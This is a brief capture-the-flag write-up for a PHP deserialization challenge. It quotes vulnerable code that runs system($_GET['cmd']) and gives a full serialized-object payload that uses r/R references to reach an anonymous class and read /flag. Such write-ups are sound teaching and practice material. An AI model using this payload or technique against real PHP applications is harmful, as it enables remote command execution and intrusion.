* **Challenge Name:** r

* **Writeup:**

Most solutions online directly call anonymous classes using the naming convention for anonymous classes, but with some restrictions added. Analysis of the source code shows:

```php
public function execute() {
                if (!is_resource($this->handle)) {
                    die("Invalid resource state<br>");
                }
                system($_GET['cmd']);
            }
```

We need to call the `execute` method in the anonymous class.

The `action` parameter needs to be an array, so we can use the `['object', 'method']` approach to call methods. We cannot use the anonymous class naming convention to call anonymous classes.

Therefore, we can leverage the built-in `r` and `R` serialization references to obtain anonymous classes. First, use `r:1` to reference itself and call the `__construct` method to generate an anonymous class stored in the first `test`'s `processor`. Then use `R` to reference the first `test`'s `processor`. After completing the anonymous class retrieval, we can call the method. The manually constructed payload is:

```
?cmd=cat /flag&p=O:8:"stdClass":2:{i:0;O:14:"RequestHandler":2:{s:9:"processor";r:1;s:6:"action";a:2:{i:0;R:2;i:1;s:11:"__construct";}}i:1;O:14:"RequestHandler":2:{s:9:"processor";N;s:6:"action";a:2:{i:0;R:3;i:1;s:7:"execute";}}}
```

